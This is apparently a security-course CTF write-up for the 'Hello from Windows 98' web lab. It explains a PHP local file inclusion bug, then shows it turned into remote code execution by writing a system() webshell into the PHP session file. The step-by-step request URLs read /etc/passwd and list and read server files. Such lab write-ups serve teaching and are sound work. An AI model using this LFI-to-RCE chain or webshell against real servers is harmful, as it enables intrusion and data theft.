---
title: Simple Web 0x01(Lab - Hello from Windows 98)
tags: [CTF, Web, eductf]

category: "Security Course｜NTU CS｜Web"
date: 2023-01-31
---

# Simple Web 0x01(Lab - Hello from Windows 98)
<!-- more -->
###### tags: `CTF` `Web` `eductf`
Challenge: https://windows.ctf.zoolab.org/

Very similar to [0x07(Lab - `HakkaMD`)](/nGAjlvyURtOcRBW1XfCfOA)

## Source code
```php
 <?php
  session_start();
  if(isset($_GET['source'])){
    highlight_file('./'.$_GET['source'].'.php');
    die();
  }
  if(isset($_GET['name']) && $_GET['name']!=''){
    $_SESSION['name'] = $_GET['name'];
    header("Location: /?page=hi.php");
    die();
  }
  if(!isset($_GET['page'])){
    header("Location: /?page=say.php");
    die();
  }
?>
<!DOCTYPE html>
<html>
<head>
  <title>Hello from Windows 98</title>
  <meta charset="UTF-8" />
  <link rel="stylesheet" href="https://unpkg.com/98.css" />
</head>
<style>
    body{
        background: url('blue.png');
        background-size: cover;
        display: flex;
        align-items: center;
        justify-content: center;
        height: 100vh;
        margin: 0;
    }
</style>
</style>
<body>
  <div class="window" style="margin: 32px; width: 500px">
    <div class="title-bar">
      <div class="title-bar-text">
        Hello World..
      </div>
      <div class="title-bar-controls">
        <button aria-label="Minimize"></button>
        <button aria-label="Maximize"></button>
        <button aria-label="Close"></button>
      </div>
    </div>
    <div class="window-body">
      <?php include($_GET['page']);?>
    </div>
  </div>
</body>
</html>

```

## Analyze
1. 第一個關鍵應該就是最下面的，代表可以利用page query到任意檔案
  ```php
  ...
      <div class="window-body">
        <?php include($_GET['page']);?>
      </div>
  ...
  ```
2. 第二個關鍵應該是透過name寫入特定檔案，而這個特定檔案就是php的session file
  ```php
  ...
    if(isset($_GET['name']) && $_GET['name']!=''){
      $_SESSION['name'] = $_GET['name'];
      header("Location: /?page=hi.php");
      die();
    }
  ...
  ```
3. 基本上如果沒有特別說明，我們都會預設題目的設定為default，那麼就可以假設php的session file放在default的folder
  * `/tmp/sess_<phpsessid>`
  * `/var/lib/php/sessions/sess_<phpsessid>`
4. 因此，我們要做的事情就可以串在一起，初次request website的時候會自動因為`session_start();`而create一個session file，並且存放在上述提到的地方，那麼我們可以利用name query的方式寫webshell進去該檔案，再利用page query的方式達到RCE

## Exploit - LFI to RCE
1. First things first, the website has `LFI` problem
  ```
  https://windows.ctf.zoolab.org/?page=/etc/passwd
  ```
  ![](https://i.imgur.com/2BHfWtQ.png)

2. <font color="FF0000">通靈</font>: It didn't provide any information about system, so we can assume the setting is default at first. 先看一下網站上的cookie seesion phpsessid是多少 → `nca4b5qigmkrl0b0bjid40cbr2`
<img src="/assets/posts/Security Course/Simple Web 0x01(Lab - Hello from Windows 98)-1.png" width=300>
3. 寫入`webshell`到session file
  ```
  http://localhost:8000/?name=<?php system($_GET['sh']); ?>
  ```
  ↓
  We use `LFI` to read session file:
  ```
  https://windows.ctf.zoolab.org/?page=/tmp/sess_nca4b5qigmkrl0b0bjid40cbr2
  
  # 如果是deploy local server在Ubuntu的話要更改session file的path
  http://localhost:8000/?page=/var/lib/php/sessions/sess_nca4b5qigmkrl0b0bjid40cbr2
  ```
  ![](https://i.imgur.com/gAnKZGF.png)
  It execute system function successfully.
  ↓
  ```
  https://windows.ctf.zoolab.org/?page=/tmp/sess_995c0ecc84473170723e595f9f4b8829&sh=ls%20/var/www/html
  ```
  ↓
  ![](https://i.imgur.com/JOOmyyl.png)
  ↓
  ```
  https://windows.ctf.zoolab.org/?page=/tmp/sess_995c0ecc84473170723e595f9f4b8829&sh=cat%20/var/www/html/flag.txt
  ```
4. Then we got flag!!!